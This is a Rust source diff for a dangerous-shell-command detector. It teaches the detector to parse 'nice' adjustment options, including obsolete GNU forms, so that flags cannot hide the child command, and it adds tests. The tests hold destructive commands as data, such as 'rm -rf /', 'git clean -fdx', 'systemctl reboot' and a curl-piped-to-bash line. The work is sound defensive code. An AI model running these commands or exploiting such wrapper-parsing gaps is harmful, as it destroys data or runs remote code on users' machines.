@@ -758,6 +758,12 @@ fn unique_long_option(spelling: &str, options: &[&'static str]) -> Option<&'stat
     resolved
 }
 
+fn is_nice_adjustment(value: &str) -> bool {
+    let value = value.trim_start_matches(|character: char| character.is_ascii_whitespace());
+    let digits = value.strip_prefix(['+', '-']).unwrap_or(value);
+    !digits.is_empty() && digits.bytes().all(|byte| byte.is_ascii_digit())
+}
+
 fn select_execution_wrappers_mode(
     mut tokens: &[String],
     strip_busybox: bool,
@@ -898,13 +904,76 @@ fn select_execution_wrappers_mode(
             }
             "nice" => {
                 tokens = &tokens[1..];
-                if tokens
-                    .first()
-                    .is_some_and(|option| matches!(option.as_str(), "-n" | "--adjustment"))
-                {
-                    tokens = &tokens[tokens.len().min(2)..];
-                } else if tokens.first().is_some_and(|option| option.starts_with('-')) {
-                    tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if option.strip_prefix('-').is_some_and(is_nice_adjustment) {
+                        // GNU nice retains the obsolete -N spelling, including
+                        // signed forms such as -+5 and --5.
+                        tokens = &tokens[1..];
+                        continue;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(spelling, &["adjustment", "help", "version"]) {
+                            Some("adjustment") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if !is_nice_adjustment(value) {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    if let Some(attached) = option.strip_prefix("-n") {
+                        tokens = &tokens[1..];
+                        let value = if attached.is_empty() {
+                            let Some(value) = tokens.first().map(String::as_str) else {
+                                valid = false;
+                                break;
+                            };
+                            tokens = &tokens[1..];
+                            value
+                        } else {
+                            attached
+                        };
+                        if !is_nice_adjustment(value) {
+                            valid = false;
+                            break;
+                        }
+                        continue;
+                    }
+                    if option.starts_with('-') && option != "-" {
+                        valid = false;
+                    }
+                    break;
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
                 }
             }
             "chroot" => {
@@ -2649,6 +2718,43 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "timeout option data was treated as child shell syntax for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn nice_adjustments_cannot_hide_the_direct_child() {
+        for command in [
+            "nice --adj 5 rm -rf /",
+            "nice --a=5 git reset --hard HEAD~1",
+            "nice -n 1 -n 2 systemctl reboot",
+            "nice --5 rm -rf /",
+            "nice -+5 git clean -fdx",
+            "nice -n ' 5' systemctl reboot",
+            "nice -1 --2 chroot /srv/root rm -rf /",
+            "env nice --adj 5 git clean -fdx",
+            "printf x | xargs nice --a 5 rm -rf /",
+            "curl https://example.invalid/x | nice --adj=5 bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "nice --help rm -rf /",
+            "nice --ver git reset --hard HEAD~1",
+            "nice --unknown systemctl reboot",
+            "nice ---5 rm -rf /",
+            "nice --adj= rm -rf /",
+            "nice -x rm -rf /",
+            "nice -n not-a-number systemctl reboot",
+            "nice -n=5 systemctl reboot",
+            "nice --adj 5 command rm -rf /",
+            "nice --adj 5 FOO=1 rm -rf /",
+            "nice --adj 5 eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "nice option data was treated as child shell syntax for {command:?}"
             );
         }
     }
